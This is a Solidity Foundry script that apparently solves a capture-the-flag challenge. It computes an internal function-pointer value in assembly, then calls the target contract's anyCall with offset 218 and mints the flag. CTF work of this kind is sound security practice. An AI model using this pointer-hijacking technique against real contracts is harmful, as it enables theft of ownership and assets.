// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IOwnable {
    function transferOwnership(address) external;
}

interface IChallenge14 {
    function anyCall(uint _func, uint data) external;

    function mintFlag() external;
}

contract FunctionPointerHelper {
    function getFunctionPointer() public pure returns (uint) {
        function(address) internal ptr = transferOwnershipPointer;
        uint addr;
        assembly {
            addr := ptr
        }
        return addr;
    }

    function transferOwnershipPointer(address newOwner) internal pure {}
}

contract FindFunctionLocation is Script {
    function setUp() public {}

    address constant TARGET = 0x41f5746eA10Ad115032e62bc25b4D76b463C1528;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        IChallenge14 challenge = IChallenge14(TARGET);
        // address sender = 0x0000007EabfC2E6a6b33b21D2f73D58941BAb574;
        // uint256 senderUint = uint256(uint160(sender));
        challenge.anyCall(218, 100);
        challenge.mintFlag();
        vm.stopBroadcast();
    }
}
